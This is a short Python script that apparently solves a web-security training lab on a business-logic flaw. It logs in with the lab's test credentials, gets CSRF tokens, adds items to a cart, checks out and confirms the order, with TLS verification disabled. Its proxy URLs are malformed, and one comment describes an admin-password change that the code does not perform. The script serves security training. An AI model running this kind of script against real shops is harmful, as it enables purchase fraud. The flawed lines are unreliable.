import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def get_csrf_token(s, url):
    r= s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text,  'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def buy_items(s, url):    
    #Retrieve the CSRF Token from the request
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)
    #Rest of the code is below
    #Login as the user using the credencials given 
    print('(+) Logging in as user Weiner...')
    Data_Login = {'csrf': csrf_token, 'username':'weiner', 'password': 'peter'}
    r= s.post(login_url, data=Data_Login, verify= False, proxies=proxies)
    res= r.text
    if 'Log out' in res:
        print('(+) Successfully logged in as the user weiner')      
        #Change the password of the admin user 
        cart_url = url + '/cart'
        data_cart = {'productId': '1', 'redir':'PRODUCT', 'Quantity': '1' }
        r = s.post(cart_url, data=data_cart, verify=False, proxies=proxies)       
        cart_url = url + '/cart'
        data_cart = {'productId': '1', 'redir':'PRODUCT', 'Quantity': '1' }
        r = s.post(cart_url, data=data_cart, verify=False, proxies=proxies)       
        #Purchase the item from the cart
        checkout_url = url + '/cart/checkout'
        checkout_csrf_token = get_csrf_token(s, cart_url)
        data_checkout = {'csrf': checkout_csrf_token}
        r = s.post(checkout_url, data=data_checkout, verify=False, proxies=proxies)
        #CONFORM THE ORDER OF THE PURCHASEMENT
        conform_url = url + '/cart/order-confirmation?order-confirmation=true'
        r = s.post(conform_url, verify=False, proxies=proxies)      
        #Successful solving message 
        if 'Congratulations' in r.text:
            print('(+) Successfully exploited the business logic vulnerability in the website ')
        else:
            print('(+) Failure to solve the business logic vulnerability Lab')
            sys.exit(-1)
    else:
        print('(+) Failure to log in as the user weiner')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()    
    url = sys.argv[1]
    buy_items(s, url)

if __name__ == '__main__':
    main()